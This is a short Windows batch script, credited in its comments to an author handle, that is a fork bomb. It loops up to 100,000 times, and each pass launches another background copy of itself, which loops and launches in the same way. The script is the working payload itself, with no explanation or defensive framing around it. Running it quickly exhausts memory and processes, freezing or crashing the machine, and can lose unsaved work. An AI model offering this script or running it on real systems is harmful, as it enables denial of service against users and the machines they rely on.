:: Programmed by hXR16F
:: hXR16F.ar@gmail.com

@echo off
mode 80,25 & setlocal EnableDelayedExpansion
if not "%1" EQU "" goto :thread %1

for /L %%m in (1,1,100000) do (echo;%%m & start /B %~nx0 %%m)

:thread %1
	for /L %%n in (1,1,100000) do (echo;%%n & start /B %~nx0 %%n)